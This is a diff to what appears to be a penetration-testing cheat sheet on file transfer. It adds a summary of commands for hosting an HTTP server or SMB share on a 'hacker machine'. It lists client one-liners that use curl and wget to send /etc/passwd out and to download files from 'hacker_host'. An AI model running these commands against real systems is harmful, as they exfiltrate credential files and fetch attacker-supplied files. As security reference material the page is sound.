@@ -31,6 +31,48 @@ We may use checksum functions/commands to check that the file was correctly tran
 
 <hr class="sep-both">
 
+## Summary
+
+<div class="row row-cols-lg-2"><div>
+
+On the hacker machine, we often host a webserver or a SMB share:
+
+```ps
+$ python -m http.server 8080
+$ php -S 127.0.0.1:8080
+```
+
+```shell!
+$ impacket-smbserver -smb2support -username username -password password share .
+```
+</div><div>
+
+The client can upload files:
+
+```ps
+$ curl http://target/ -F "data=@/etc/passwd"
+$ wget "--post-file=/etc/passwd" "http://target/"
+```
+
+```shell!
+PS> copy file.txt \\HOST_IP\share_name\path
+```
+
+The client can download files:
+
+```ps
+$ wget http://hacker_host/myfile [...]
+$ curl http://hacker_host/myfile [...]
+```
+
+```shell!
+PS> copy \\HOST_IP\share_name\file_path
+```
+
+</div></div>
+
+<hr class="sep-both">
+
 ## Sending a file to others 🔒
 
 <i class="small">On the "host" where the file is:</i>
